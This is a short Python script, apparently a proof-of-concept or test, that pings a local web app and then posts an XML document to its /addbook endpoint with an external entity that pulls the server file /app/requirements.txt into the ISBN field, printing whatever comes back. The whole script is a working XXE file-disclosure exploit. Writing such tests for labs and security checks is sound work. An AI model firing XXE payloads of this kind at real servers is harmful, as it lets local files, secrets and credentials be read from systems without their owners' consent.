import requests
import sys

try:
    print("Testing connection...")
    response = requests.get('http://127.0.0.1:5000/', timeout=5)
    print(f"Connection successful: {response.status_code}")
except Exception as e:
    print(f"Connection failed: {e}")
    sys.exit(1)

try:
    xml = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///app/requirements.txt">]><Book><Title>T</Title><ISBN>&file;</ISBN><Editor>E</Editor><Publisher>P</Publisher><Chapters></Chapters></Book>'
    response = requests.post('http://127.0.0.1:5000/addbook', data={'xml': xml}, timeout=10)
    print(f"Status: {response.status_code}")
    print(response.text)
except Exception as e:
    print(f"Error: {type(e).__name__}: {e}")

